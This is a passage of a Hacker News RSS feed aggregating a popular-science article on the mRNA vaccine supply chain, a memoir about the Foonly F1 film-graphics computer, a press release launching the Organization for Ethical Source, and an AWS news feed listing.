  <tr>
   <td>sodium chloride
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>basic sodium phosphate dihydrate
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>tromethamine (tris(hydroxymethyl)aminomethane)
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>tromethamine hydrochloride
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>acetic acid
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>sodium acetate
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>water
   </td>
   <td>✔
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Other</span></strong>
   </td>
  </tr>
  <tr>
   <td>sucrose
   </td>
   <td>✔
   </td>
   <td>✔
   </td>
  </tr>
</tbody></table>

<p>In addition to what’s in the vaccine vial, Pfizer-BioNTech needs to be diluted with sodium chloride shortly before use (more about that below). The Moderna vaccine does not seem to require such a “DIY assembly” step.</p>

<p>Now that we know all the ingredients, let’s go shopping.</p>

<p>Disclaimer: Please don’t perform chemistry or create pharmaceuticals unless you have the appropriate safety training and equipment. I include links to online shops below, but note that they sell “for research use only” and will verify your affiliation with a research organization before taking your business.</p>

<h2 id="mrna">mRNA</h2>

<p>To make RNA, you start by making DNA. This makes sense if you know the <a href="https://en.wikipedia.org/wiki/Central_dogma_of_molecular_biology">central dogma of molecular biology</a> which, for the purposes of this article, can be simplified to “DNA makes RNA, and RNA makes protein”.  Making DNA is a known, stable process in 3 steps:</p>

<ol>
  <li><strong>Create:</strong> Synthesize a small number of copies of the desired DNA, somehow. There are vendors for this sort of thing such as <a href="https://twistbioscience.com/">Twist Bioscience</a> just down the street from my apartment when I lived in San Francisco.</li>
  <li><strong>Copy:</strong>
    <ol>
      <li>Insert this DNA into innocent <a href="https://en.wikipedia.org/wiki/Escherichia_coli">E. coli bacteria</a> by means of <a href="https://en.wikipedia.org/wiki/Electroporation">electroporation</a>, i.e. zapping them.</li>
      <li>Put those bacteria into a stainless steel growth chamber full of nutrients and let them multiply for four days.</li>
      <li>Drain the vat, kill the bacteria, and <a href="https://en.wikipedia.org/wiki/DNA_extraction">extract the DNA</a>. Depending on growth chamber volume, this may take one week or longer.</li>
    </ol>
  </li>
  <li><strong>Verify:</strong> Perform several tests to confirm that the DNA you got is the DNA you wanted. There’s no need for me to explain how testing for the presence of specific DNA sequences works, y’all learned that nine months ago when you did your reading about how COVID-19 tests work.</li>
</ol>

<p>This yields grams of DNA and what is needed are bags of mRNA. mRNA is the most discussed ingredient of the vaccine for three reasons:</p>

<ol>
  <li>mRNA is the active ingredient of the vaccine.</li>
  <li>It is the first time an mRNA vaccine has been approved and is now produced at scale.</li>
  <li>The skills to produce mRNA at scale and the associated supply chain are new.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>
The conversion process from DNA to mRNA in living cells is well understood. However, doing it at scale, in a factory, and with a long shelf-life is still an area of development. To multiply the DNA we utilized E.coli and this tiny organism comes with all components needed for the job. The same process does not work for making mRNA for the vaccine. Instead, the DNA gets combined with nucleotides and polymerase, and in some cases special enzymes that protect the mRNA.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
</ol>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Nucleotide">Nucleotides</a> are the raw building blocks for the mRNA.</li>
  <li>RNA <a href="https://en.wikipedia.org/wiki/Polymerase">Polymerases</a> read DNA and translate it to mRNA using these nucleotides.</li>
  <li>A method to protect the mRNA from degradation either co- or post-transcriptionally.</li>
</ul>

<p>The third part, protecting the mRNA, is the crux of the matter. mRNA is not very stable especially at the ends. If you lose the first and last word of a sentence its meaning may be lost entirely. The same can happen here and the vaccine would not work anymore.</p>

<p>To protect the beginning of the mRNA statement, a <a href="https://en.wikipedia.org/wiki/Five-prime_cap">5’ cap</a> is added. To do so while the mRNA is transcribed (co-transcriptionally) a 5’ cap analogue is added to the reaction mixture and incorporated by the polymerase when it reads a specific initiator sequence. There is only one vendor for this analogue; <a href="https://www.trilinkbiotech.com/cleancap-reagent-ag-3-ome.html">TriLink</a> and its partner <a href="https://www.tebu-bio.com/">tebu-bio</a> for the European market. Post-transcriptionally it can be done using a mRNA Cap 2′-O-Methyltransferase and the vaccinia capping enzyme (VCE).<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> (The “vaccinia” in the name has nothing to do with these COVID vaccines.) The co-transcriptional method is generally more suitable for industrial processes as there is no need for an additional post-purification and it is faster since it works in one step. In their July 2020 investor update BioNTech refers to usings TriLinks trinucleotide cap and hence this is likely part of the production method of the approved vaccine.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup> Ultimately, the cap analogue or the VCE can drive cost and present bottlenecks if production is not increased accordingly.<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup></p>

<p>To protect the end of the mRNA we add a <a href="https://en.wikipedia.org/wiki/Polyadenylation">poly(A) tail</a> to the message either by encoding it in the DNA template or using a Poly(A)Polymerase. Both <a href="https://biontech.de/how-we-translate/mrna-therapeutics">BioNTech</a> and Moderna are using the faster and convenient DNA template approach.</p>

<p>All ingredients of the vaccine besides the mRNA are “<a href="https://en.wikipedia.org/wiki/Excipient">excipients</a>”, substances whose purpose is somehow related to getting the vaccine from the factory into a human cell.</p>

<h2 id="lipids">Lipids</h2>

<p>Lipids are fatty molecules. Each of the two vaccines contains four types of lipid. Cholesterol, phosphatidylcholine, an ionizable cationic lipid, and PEGylated phospholipds. In the vaccine, these lipids form a capsule around the RNA called <a href="https://en.wikipedia.org/wiki/Solid_lipid_nanoparticle">lipid nanoparticle</a> (LNP) that protects it from the hostile environment until it is inside a human cell.</p>

<p>Both Pfizer-BioNTech and Moderna use the same structural components which are already approved in many drugs.</p>

<ul>
  <li><strong>DSPC</strong>, full name <a href="https://en.wikipedia.org/wiki/Distearoylphosphatidylcholine">Distearoylphosphatidylcholine</a> or 1,2-distearoyl-sn-glycero-3-phosphocholine, is a key component of the lipid bilayer that protects the mRNA.</li>
  <li><strong>Cholesterol</strong> is natural to the human body. In the vaccine it is used to achieve optimal liposome formation and structure.</li>
</ul>

<p>The other two ingredients are used to optimize the LNPs for its cargo and the delivery<sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup> and are novel or uncommon in drug formulation.</p>

<ul>
  <li><strong>Cationic</strong>, or positively charged, lipids bind to and help stabilize the negatively charged mRNA during assembly. Once inside the cell, the cell’s different pH environment triggers the release of mRNA
    <ul>
      <li>
        <p>Pfizer-BioNTech uses <a href="https://en.wikipedia.org/wiki/ALC-0315">ALC-3015</a> patented by Acuitas Therapeutics, Inc.<sup id="fnref:7" role="doc-noteref"><a href="#fn:7">7</a></sup> and it is the most abundant lipid in the mix<sup id="fnref:8" role="doc-noteref"><a href="#fn:8">8</a></sup>.</p>
      </li>
      <li>
        <p>Moderna has a proprietary …</p></li></ul></li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/">https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/</a></em></p>]]>
            </description>
            <link>https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25837899</guid>
            <pubDate>Tue, 19 Jan 2021 19:46:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Foonly F1 Computer]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25837698">thread link</a>) | @dcminter
<br/>
January 19, 2021 | http://dave.zfxinc.net/f1.html | <a href="https://web.archive.org/web/*/http://dave.zfxinc.net/f1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div size="3">
I first encountered the Foonly F1 when I went to work for Omnibus Computer Graphics in 1984.
Omnibus had just purchased the system from Triple-I (Information International Inc.) in
Culver City, CA.  Omnibus had big plans to make movies with computers, and the F1 had
been used in making TRON and numerous other high resolution film projects.  Omnibus was
a Canadian company, based in Toronto, and had recently done gone public.  They had big
plans to open offices in Hollywood and New York City and be the first big digital animation
company in the film business.  Omnibus president, John Pennie saw the F1 as a machine 
with a proven track record.  When I first had a look at it, I saw it as a disaster!  It was a fascinating R&amp;D project, but was never really designed to have the support, spares, and expertise needed to keep it up and running in a serious production environment.
<p>
The F1 was originally built by Triple-I in hopes of getting a large contract
with the Government for an Optical Character Recognition system.
Its design was done by some graduate students (Stanford?) named Poole, Pettit, Holloway, and Dyer (?).
As I understand it, their design became the DEC KL-10, but I could have that wrong.
The CPU was built on five wire-wrap pages, that were machine wrapped.
</p><p>
The design was done using one of the first CAD systems I had seen, (SUDS?) which I believe ran
on a PDP-15 clone that Triple-I used in its PFR-80, which was originally intended to be a film recorder.
The PFR had a vector-tube graphics display, and the user could graphically connect various
logic elements from libraries and have wire-wrap lists generated for machine wrapping.
The PFR, incidentally, was the reason the F1 became a film-maker. 
Triple-I had figured out how to get a smaller, better controlled spot out of a CRT than
anybody else at the time, and used that technology to print film for newspaper pages.
</p><p>
<i>Author's Note: I have several of the high-rez CRTs used in the III film printers, if anybody is interested in them, please contact me, (dave (at) zfx.com).</i>
</p><p>
The F1 had a bizzarre bus interface to the PFR that allowed it to dump high resolution
imagery to the PFR and have it print to a standard 35mm camera.  The images were
send in Red, Blue, and Green records and exposed through Wratten filters onto Kodak 5247 color negative film.
Another PFR note, someone at Triple-I had programmed a simple graphics game to run on
the PDP-15 and the vector tube.  You used front-panel dials and buttons to control
acceleration and rotation vectors for spaceships that could shoot particles at each
other.  I'm not sure of the exact origin of this program, but I believe it was
the first interactive vector graphics game, which ultimately gave rise to a group of
vector-displayed videogames in the mid-eighties.
</p><p>
The F1 had enough in common with "standard" DEC-10 peripherals that it could use
a disk channel controller( RH-10?).  This was attached to  three RP-04 (~50MB) disk drives,
one for the system, and two striped together to hold a total of two high-res images.
One would be computed and saved as separate RGB files, while the previous one was
being printed on the PFR.  The F1 had a huge Ampex core memory unit that I believe
held 256K 36-bit words.  That turned out to be barely enough to do high-resolution
computer graphics, so Triple-I had built the MMM, Movie Machine Memory, which
was built out of 4K static RAM chips.  The memory was organized so that it could
be displayed as an RGB image at 1024 x 1024 on a raster high-resolution monitor.
In that mode, the MMM held 6 bits per color, 18-bits per pixel.  It could also
be used as a bulk 512K word memory for the TRANEW graphics rendering program, which 
used it to store hash tables.  It was fascinating to "watch" the program execute
on the MMM monitor.
</p><p>
<i>I actually have one of the MMM memory boards.... somewhere in my junk pile.</i>
</p><p>
The F1 required a DEC KA-10 as a "console processor".
Since it was a development machine, the console was used to load and run the
microcode.  It was also an important debugging tool when (not if!) the system
did something screwy.  There was a modem attached to the KA-10, and in an
emergency, Dave Poole could usually be persuaded to dial into it and run diagnostics.
Of course, the console machine had its own disk controllers, disks, tape drives,
even a line printer, and it ended up holding user accounts and acting as general
non-job user disk storage.  The KA-10 itself booted from punched paper tape, so
a cold-start for the entire system was quite a journey up from ground zero!
</p><p>
When the F1 was up, it probably ran at something like 6 MIPS.  That seems really
slow by today's standard, but the code had been highly optimized.  The original
Fortran program, TRANEW had been written by Gary Demos  with help from Jim Blinn,
the JPL guy that did the pioneering computer-generated fly-by animations for NASA.
They had optimized inner loops in assembly code, and had removed every last bit
of "extraneous" code from the operating system, TOPS-10.  It was really more like
Swiss Cheese than an OS.
</p><p>
A second PFR unit acted as an "encoding station", and was attached to a huge Calcomp
digitizing tablet.  External vector displays had been added, as had another puck,
so that the operator could digitize from engineering-type drawings to build a
3D database for the objects used in the animations.  There were some fairly
sophisticated programs for extruding solids, sweeping shapes through 3D paths,
and other wonders, all executing on a PDP-15!
</p><p>
So when I arrived and saw this system in operation, my initial awe for the amount
of pioneering work that had gone into making the system do all the things it had
done quickly turned into a sense of dread given the tasks I had before me, which
were to: (1) re-assemble enough of the original team-members that had used the
system to be able to do feature film production, (2) learn how the system functioned
so that it could be maintained and kept working on a grueling production schedule,
(3) attempt to find areas where its performance or reliability could be improved,
(4) MOVE the system to new facilities that were being built at Paramount Studios,
and (5) stay sane!
</p><p>
Jim Rapley, who was one of the maintenance guys who knew the Foonly, and had
worked with many of the people as it was developed at Triple-I came onboard first,
followed soon by Art Durinski, a designer who had worked on TRON, Adam the Juggler, and
many other Foonly projects.  Rich Schroeppel, a consultant for Triple-I had done
the TOPS-10 hacks and occasionally consulted, as did Jim Dungan, who knew TRANEW
and a lot of the code that ran in the PFR.
</p><p>
Of course, Gary Demos and John Whitney, having gotten Triple-I started in the movie
business, saw all the shortcomings of the Foonly.  They had pushed for Triple-I
to build the DFP, the first (that I know of) high-resolution digital film printer
for motion pictures.  This was the next generation PFR, using an 8" CRT which had
fast-decaying phosphors so that it could be used for scanning in film (using photomultiplier
tubes built into a special camera) as well as printing.  The imagery was amazing.
When they left Triple-I, they put together a deal where they got Control Data Corp.
to buy a Cray supercomputer, rent the DFP from Triple-I, attache Ramtek displays
and IMI and Evans &amp; Sutherland vector tubes for encoding and motion.  That was
Digital Productions, which Omnibus eventually bought from CDC, but I'm getting
ahead of myself.  
</p><p>
The point is that Triple-I just wanted to unload the Foonly and all its peripherals
and software as one big package, and Omnibus and John Pennie were the perfect sucker.
So Jim Rapley knew a guy named Serge Polevitzki, who was at the Naval Ocean (?NOSC) down
in San Diego.  NOSC apparently had a bunch of stuff that needed to run on a TOPS-10
system and since DEC no longer made them, Dave Poole and Foonly, Inc. obliged them
by coming up with the F4, a single rack-unit 36-bit computer that ran TOPS-10.
I flew up to Berkeley to see Poole and discuss upgrades to the F1.
</p><p>
Poole was a character.  He had long hair and a long beard and glasses.  I met him
at Foonly, Inc. which was a small warehouse that had been the assembly line for
some thirty F4's.  He wore ragged clothing and bluejeans, and had a pet parrot
that rode on his shoulder most of the time.  When the parrot wasn't on his
shoulder, it was perched in one of the "unfinished" F4's.  There was a precision
shaped piece of cardboard duct-taped into this particular machine in such a
way that the bird's droppings were deflected away from the internals of the
machine.  Poole's recommendation was that we have him build us an SMD disk
controller so that we could use bigger, faster disks, like the Fujitsu Eagles
that were popular SMD drives at the time.  Unfortunately, his schedule to do this
was going to take months, and our production schedule was already overfull.
He did what he could on the microcode side, but the upgrade never happened.
</p><p>
Probably the worst moment of my life with the Foonly came after we had managed
to get it moved to Paramount Studios and were cranking through the film for
a long sequence for Flight of the Navigator, a Disney film.  In those days,
the idea that you could have a camera make a seemingly infinite move, untethered,
fascinated film directors, so they all wanted long camera moves over an infinte
plane, probably the hardest thing for rendering algorithms to manage, what with all that 
depth sorting.  Since the Foonly only had enough disk storage to hold the frame
being computed and the frame being printed, the numbers worked out like this:
30 seconds of film at 24 frames per second works out to 720 images each computed
and printed at 6000 x 4000 pixels.  At twenty minutes rendering time each frame,
that meant it took ten days to do "the run".  As we were five days into our
final "run" for Navigator, unknown to us, a Paramount electrician was outside
hot-wiring …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://dave.zfxinc.net/f1.html">http://dave.zfxinc.net/f1.html</a></em></p>]]>
            </description>
            <link>http://dave.zfxinc.net/f1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25837698</guid>
            <pubDate>Tue, 19 Jan 2021 19:29:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A New Kind of Open Source Organization]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25837595">thread link</a>) | @scastiel
<br/>
January 19, 2021 | https://ethicalsource.dev/blog/oes-announcement/ | <a href="https://web.archive.org/web/*/https://ethicalsource.dev/blog/oes-announcement/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="veil">
      
      
<section>


<h3 id="creators-of-the-hippocratic-license-establish-a-nonprofit-to-empower-developers-to-use-their-technology-talents-for-social-good-and-to-prevent-harm">Creators of the Hippocratic License establish a nonprofit to empower developers to use their technology talents for social good and to prevent harm</h3>

<p>Geneva, Switzerland, January 19, 2021 – The creator of the <a href="https://firstdonoharm.dev/">Hippocratic License</a>, an ethical license for open source, and <a href="https://contributor-covenant.org/">Contributor Covenant</a>, the first and most popular code of conduct for open source projects, today announced the establishment of a new nonprofit, the Organization for Ethical Source (OES).</p>

<p>Central to the philosophy of open source is the notion of software freedom, referred to as “Freedom Zero”: that open source software can be used for any purpose without restriction, <a href="https://opensource.org/faq#evil">even for explicitly “evil” purposes</a>. The world has changed since the Open Source Definition was created — open source has become ubiquitous, and is now being leveraged by bad actors for mass surveillance, racist policing, and other human rights abuses all over the world. The OES believes that the open source community must evolve to address the magnitude and complexity of today’s social, political and technological challenges.</p>

<p>Inspired by the work of Latinx and Chicanx activist organization <a href="https://twitter.com/conmijente">Mijente</a> and their #NoTechForICE campaign, the Ethical Source Movement <a href="https://ethicalsource.dev/blog/ethical-source-six-month-retrospective/">launched in October 2019</a>. Its first milestone was the March 2020 release of the Hippocratic License 2.1, an ethical open source license tied to the United Nations Universal Declaration of Human Rights and developed in collaboration with a pro-bono legal team from partner organization <a href="https://corpaccountabilitylab.org/">Corporate Accountability Lab</a>. The license has already been adopted by hundreds of open source projects including the Ruby library <a href="https://github.com/vcr/vcr/">VCR</a>, mobile app development tool <a href="https://github.com/vinivendra/Gryphon">Gryphon</a>, Javascript mapping library <a href="https://react-leaflet.js.org/">react-leaflet</a>, and the entire open source portfolio of the <a href="https://ideas.bywetransfer.com/story/ethical-source-at-wetransfer">WeTransfer</a> corporation. But the most significant impact of the license may be the <a href="https://builtin.com/software-engineering-perspectives/ethical-source-hippocratic-license">debate it sparked</a> between ethical-minded developers and open source traditionalists around the primacy of “Freedom Zero.”</p>

<p>“For too long we’ve been comforting ourselves with the myth that technology is inherently neutral. But there is nothing neutral about police using facial recognition algorithms to target legitimate protestors, or algorithms that perpetuate bias and sexism and racism, or any other of the dozens of kinds of human rights abuses we see technology playing a part in today,” said Coraline Ada Ehmke, president and founder of the Organization for Ethical Source. “As technologists we have to accept that our work has an outsized impact on society, and that means we have an outsized responsibility to minimize the harm it can cause. The Organization for Ethical Source was founded to help technologists accept these responsibilities, and learn how to center justice and equity in the work we do. We are united in our conviction that software freedom must not come before human freedom.”</p>

<p>With a founding grant from the <a href="https://omidyar.com/">Omidyar Network</a>, the Organization for Ethical Source is developing new programs that build on its initial work with the Hippocratic License — extending the reach of that effort while developing new tools and projects focusing on ethical governance, digital supply chain compliance, and other strategies. The organization’s leadership team includes founding members Coraline Ada Ehmke, Don Goodman-Wilson, and Tobie Langel. Elections for the Governing Committee are slated to take place in February 2021.</p>

<p>“There are so many ways that communities can come together today to tackle the tech industry’s biggest problems, and that is especially true about the open source community,” said Aniyia L. Williams, Principal, Responsible Technology, Omidyar Network. “We are excited to see the formation of the Organization for Ethical Source, and are thrilled to power the innovative, thoughtful, and courageous plans they have for creating accountability in building software.”</p>

<p>“Systemic change in the tech industry is long overdue, and the Organization for Ethical Source is a much-needed catalyst,” said Charity Ryerson, Executive Director of Corporate Accountability Lab. CAL is a nonprofit organization providing legal support to the new organization through developing ethical license offerings and providing free direct legal services to ethical license adopters. “We are excited to support this initiative, and hope to see tangible improvements for cobalt miners, Foxconn workers, immigrant detainees and others who have been harmed by Big Tech.”</p>

<p>The Organization for Ethical Source brings together open source maintainers and contributors, tech ethicists and advocates, licensing experts, human rights workers, academics, and more to strategize about ways to incorporate ethics into open source work. <a href="https://ethicalsource.dev/">Learn more about the Organization for Ethical Source</a>, or <a href="https://ethicalsource.dev/apply">apply to join</a>.</p>

<h3 id="about-the-organization-for-ethical-source">About the Organization for Ethical Source</h3>

<p>The movement to promote ethics and social responsibility in open source was founded in October 2019 by Coraline Ada Ehmke, and led to the establishment of the nonprofit Organization for Ethical Source under Swiss law in December 2020. The organization is dedicated to giving technologists tools and resources to ensure that their work is being used for social good and to minimize harm. It develops tools to promote fair, ethical, and pro-social outcomes for those who contribute to, or are affected by, open source technologies. <a href="https://ethicalsource.dev/">https://ethicalsource.dev/</a></p>

</section>

      
    </div></div>]]>
            </description>
            <link>https://ethicalsource.dev/blog/oes-announcement/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25837595</guid>
            <pubDate>Tue, 19 Jan 2021 19:22:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: RSS Feeds with News from AWS]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25836975">thread link</a>) | @matthieuchabert
<br/>
January 19, 2021 | https://www.cloudnews.dev/feeds | <a href="https://web.archive.org/web/*/https://www.cloudnews.dev/feeds">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-phx-main="true" data-phx-session="SFMyNTY.g2gDaAJhBHQAAAAHZAACaWRtAAAAFHBoeC1GbHlQX0N1c0VNVDV3QXZCZAAKcGFyZW50X3BpZGQAA25pbGQACHJvb3RfcGlkZAADbmlsZAAJcm9vdF92aWV3ZAAnRWxpeGlyLkNsb3VkTmV3c1dlYi5QdWJsaWNSU1NMaXZlLkluZGV4ZAAGcm91dGVyZAAaRWxpeGlyLkNsb3VkTmV3c1dlYi5Sb3V0ZXJkAAdzZXNzaW9udAAAAABkAAR2aWV3ZAAnRWxpeGlyLkNsb3VkTmV3c1dlYi5QdWJsaWNSU1NMaXZlLkluZGV4bgYA03g4KncBYgABUYA.ttbPcqzm4IlEHuB4JDEx3rLsBhys1gMLR594P37Os3k" data-phx-static="SFMyNTY.g2gDaAJhBHQAAAADZAAKYXNzaWduX25ld2pkAAVmbGFzaHQAAAAAZAACaWRtAAAAFHBoeC1GbHlQX0N1c0VNVDV3QXZCbgYA1Hg4KncBYgABUYA.bWKbOCqFaDHf4HqSsJwZG7jcVA4rwJLKdTiX0KZemsQ" data-phx-view="PublicRSSLive.Index" id="phx-FlyP_CusEMT5wAvB"><div>



<section>
  
  
  <div>
    <ul>

        <li>
          <div x-data="{ link: 'https://www.cloudnews.dev/rss/aa3005f0-02b3-442f-96d4-71c4040e845e/feed.xml' }">
            <h2>AWS Serverless Feed</h2>
            <p><span @click="$clipboard(link)">copy link <i></i></span>
          </p></div>
          
          <div>
          <h3><span>News</span></h3>
          <div x-data="{show:false, show_social: false}">

              <div>
                <div>
                  <div>
                    <p>
AWS Step Functions adds support for AWS Glue DataBrew jobs to prepare data in analytics and machine learning workflows
                      <a href="https://aws.amazon.com/about-aws/whats-new/2021/01/aws-step-functions-support-aws-glue-databrew-jobs-data-analytics-machine-learning-workflows/" target="_blank"><i></i></a>
                    </p>
                    <p>
2021-01-06
                    </p>
                  </div>
                </div>
                </div>

              <div>
                <div>
                  <div>
                    <p>
AWS Lambda now supports SASL/SCRAM authentication for functions triggered from Amazon MSK 
                      <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-now-supports-sasl-scram-authentication-for-functions-triggered-from-amazon-msk/" target="_blank"><i></i></a>
                    </p>
                    <p>
2020-12-18
                    </p>
                  </div>
                </div>
                </div>

            
            <div x-show="show" x-cloak="">

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda now makes it easier to build analytics for Amazon Kinesis and Amazon DynamoDB Streams
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-easier-build-analytics-amazon-kinesis-amazon-dynamodb-streams/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-16
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda launches checkpointing for Amazon Kinesis and Amazon DynamoDB Streams
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-launches-checkpointing-for-amazon-kinesis-and-amazon-dynamodb-streams/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-16
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda now makes it easier to build analytics for Amazon Kinesis and Amazon DynamoDB Streams
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-easier-build-analytics-amazon-kinesis-amazon-dynamodb-streams/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-15
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda now supports self-managed Apache Kafka as an event source
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-now-supports-self-managed-apache-kafka-as-an-event-source/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-15
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda changes duration billing granularity from 100ms down to 1ms  
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-changes-duration-billing-granularity-from-100ms-to-1ms/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-01
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda now supports container images as a packaging format
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-now-supports-container-images-as-a-packaging-format/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-01
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda now supports up to 10 GB of memory and 6 vCPU cores for Lambda Functions 
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-supports-10gb-memory-6-vcpu-cores-lambda-functions/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-01
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda now supports batch windows of up to 5 minutes for functions with Amazon SQS as an event source
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/aws-lambda-now-supports-batch-windows-of-up-to-5-minutes-for-functions/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-24
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Step Functions now supports Synchronous Express Workflows 
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/aws-step-functions-now-supports-synchronous-express-workflows-/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-24
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Amazon EC2 Fleet and Spot Fleet now integrate with Amazon EventBridge for easier operations and monitoring
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/amazon-ec2-fleet-and-spot-fleet-integrate-with-amazon-eventbridge-easier-operations-monitoring/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-24
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Announcing Code Signing, a trust and integrity control for AWS Lambda
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/announcing-code-signing-a-trust-and-integrity-control-for-aws-lambda/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-24
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Amazon EventBridge adds Server-Side Encryption (SSE) and increases default quotas
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/amazon-eventbridge-adds-server-side-encryption-sse-and-increases-default-quotas/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-24
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda now supports Advanced Vector Extensions 2 (AVX2)
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/aws-lambda-supports-advance-vector-extensions-2/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-24
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Amazon EventBridge announces improved resource policies for event buses
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/amazon-eventbridge-announces-improved-resource-policies-for-event-buses/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-20
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Step Functions now supports Amazon API Gateway service integration
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/aws-step-functions-supports-amazon-api-gateway-service-integration/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-17
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Step Functions now supports Amazon EKS service integration
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/aws-step-functions-now-supports-amazon-eks-service-integration/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-16
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
AWS Lambda now makes it easier to send logs to custom destinations
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/aws-lambda-send-logs-custom-destinations/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-12
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Amazon EventBridge introduces support for Event Replay
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/11/amazon-eventbridge-introduces-support-for-event-replay/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-11-06
                      </p>
                    </div>
                  </div>
                  </div>

            </div>
          </div>
          </div></li>

        <li>
